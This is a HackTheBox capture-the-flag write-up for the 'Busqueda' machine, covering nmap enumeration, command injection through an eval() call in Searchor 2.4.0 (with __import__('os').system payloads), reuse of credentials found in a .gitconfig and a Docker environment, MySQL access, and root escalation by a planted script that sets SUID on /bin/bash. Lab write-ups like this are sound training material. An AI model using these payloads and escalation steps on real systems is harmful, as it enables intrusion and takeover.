---
title: "Busqueda Writeup - HackTheBox"
date: 2024-10-26
draft: false
Tags:
- HackTheBox
- Linux
- Easy
- NetSecFocus
- TJNull
---

| Link:      | https://app.hackthebox.com/machines/Busqueda |
| ---------- | -------------------------------------------- |
| Difficulty | Easy                                         |
| Machine    | Linux                                        |

---
# Enumeration
### Nmap Scan
```
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80 (http)
I added `searcher.htb` to my `/etc/hosts` file and checked the site. This is what the site looks like:
![](assets/Pasted%20image%2020241026095230.png)

After exploring the site and performing enumeration, such as directory fuzzing, I noticed that the site uses Flask and Searchor 2.4.0. Here, Searchor 2.4.0 is vulnerable to command injection.

### Explanation of the Vulnerability
In file **`src/sarchor/main.py`** of **`Searchor <= 2.4.2`** there is a function call **`eval()`**:
```python
@click.argument("query")
def search(engine, query, open, copy):
    try:
        url = eval( # <<< HERE 
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
        click.echo(url)
        searchor.history.update(engine, query, url)
        if open:
            click.echo("opening browser...")
	  ...
```

This makes it vulnerable to command injection since the input isn't sanitized. We can use the following payloads for command injection:
- `__import__('os').system('<CMD>')`
- `__import__('os').popen('<CMD>').read()`
- `etc`

### PoC & Exploit
I found a nice little exploit for this here: [Exploit for Searchor 2.4.0 - Arbitrary CMD Injection](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection).

All I did was clone the repository and run the `exploit.sh` proof-of-concept script they provided. I ran the following command while also having netcat listening on port 1337.
![](assets/Pasted%20image%2020241026100435.png)

After the script executes, I see a reverse shell of the user `svc` pop up in our listener, and we also obtain our `user.txt` flag.

![](assets/Pasted%20image%2020241026100554.png)

# Privilege Escalation to Root
I looked around the system and found two nice info. At `/home/svc` there is a folder `.gitconfig`:
```
svc@busqueda:~$ cat .gitconfig
cat .gitconfig
[user]
	email = cody@searcher.htb
	name = cody
[core]
	hooksPath = no-hooks
```

I looked around the system and found two interesting pieces of information. In `/home/svc`, there is a folder named `.gitconfig`:
![](assets/Pasted%20image%2020241026104949.png)

Here, credentials are supplied using the URL scheme to `gitea.searcher.htb`. I will add this to my `/etc/hosts` file and then try to access it. I might use the credentials there to find something useful. 

And yes, `cody:jh1usoih2bkjaspwe92` worked! Yay! However, I didn't find anything useful on the website. 

I performed a random `sudo -l` check with the credentials above, and since the user is Cody, password reuse must be the case for the user Cody in this situation. And yes! It worked.
```
svc@busqueda:/var/www/app/.git$ sudo -l -S
[sudo] password for svc: jh1usoih2bkjaspwe92
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

And we have a possible vector for root as well. However, the fact that we can't read the source code for this file means we are restricted to execute permission here.

I tried the following test argument, which lets us know the allowed arguments.
```
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py test
<usr/bin/python3 /opt/scripts/system-checkup.py test
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Using `sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps` lists two containers running: `gitea` and `mysql`.

We can probably retrieve some sort of credentials from the MySQL container. We can try using `docker inspect`.
```
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
<thon3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

We need the format and the container name in order to inspect the Docker container. We know the container name, but we need the format. I found this: [Docker Formatting Documentation](https://docs.docker.com/engine/cli/formatting/), which explains how the formatting works.

So I ran the following command (the `jq .` part is for JSON formatting; learn more about `jq` [here](https://jqlang.github.io/jq/)):
```bash
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
```

I also found the database password here:
```
"Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ]
```

I'm not sure how useful the database password might be, but let's see.  
I want the instance's IP address. For that, I found this formatting on [this site](https://docs.docker.com/reference/cli/docker/inspect/#examples):
![](assets/Pasted%20image%2020241026110824.png)

I will modify it for my use case like this:
```bash
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq .
```

Which outputs the following:
```
{
  "docker_gitea": {
    "IPAMConfig": null,
    "Links": null,
    "Aliases": [
      "f84a6b33fb5a",
      "db"
    ],
    "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
    "EndpointID": "bf915680ed570128582ba98f8f91606a9941f07c1b0bf344155b9bb360722475",
    "Gateway": "172.19.0.1",
    "IPAddress": "172.19.0.3",
    "IPPrefixLen": 16,
    "IPv6Gateway": "",
    "GlobalIPv6Address": "",
    "GlobalIPv6PrefixLen": 0,
    "MacAddress": "02:42:ac:13:00:03",
    "DriverOpts": null
  }
}
```

I know the IP address, database username, and database password, so let's try to connect to the MySQL database.
```bash
mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
```

I tried to extract all user information, but it didn't fit properly in the terminal.
![](assets/Pasted%20image%2020241026112027.png)

So I only tried to display interesting information, so I used the query `SELECT name, email, passwd FROM user;`, which reveals the user's password here.
![](assets/Pasted%20image%2020241026112219.png)

I tried to crack the password but had no success. After a while, I reused the database password as the administrator's password to see if the admin credentials and database credentials were the same. 

To my surprise, `administrator:yuiu1hoiu4i5ho1uh` worked, and I am in.

There is a private repository in the admin profile, which contains the scripts we found in the `/opt/scripts` directory. Since we now have the source code for these scripts, we may try to use them to exploit the script and gain root access.
![](assets/Pasted%20image%2020241026112517.png)

Since we are most interested in `system-checkup.py`, as the user `svc` can run it as root, I looked at its source code and found something interesting. The script runs `./full-checkup.sh` when we supply the argument `full-checkup`.
![](assets/Pasted%20image%2020241026112840.png)

If we run `system-checkup.py` with the argument `full-checkup`, it prints `"Something went wrong"`.
![](assets/Pasted%20image%2020241026113105.png)

You may ask why. It's because of the `try-except` block being used. It attempts to run `./full-checkup.sh`, but since the file isn't present in the current directory from which we are running the script, it fails.

We can now try to exploit the `system-checkup.py` script by creating our own `full-checkup.sh` script in the `/tmp` directory and running the command from there. In our custom-made script `full-checkup.sh`, I will essentially make `/bin/bash` a SUID executable binary so I can easily gain root access.

I created the following script and granted it execute permission.
```
svc@busqueda:/tmp$ cat full-checkup.sh 
#!/bin/bash

chmod u+s /bin/bash
```

Now I will run the following command, and we should have our bash binary set as a SUID executable.
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

![](assets/Pasted%20image%2020241026114407.png)

We no longer receive the `"Something went wrong"` error, which means our bash script ran successfully. We should have root access now.
![](assets/Pasted%20image%2020241026114647.png)

# Conclusion
Thanks for reading my walkthrough. This box was nice and was part of TJNull's "[NetSecFocus Trophy Room](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#).
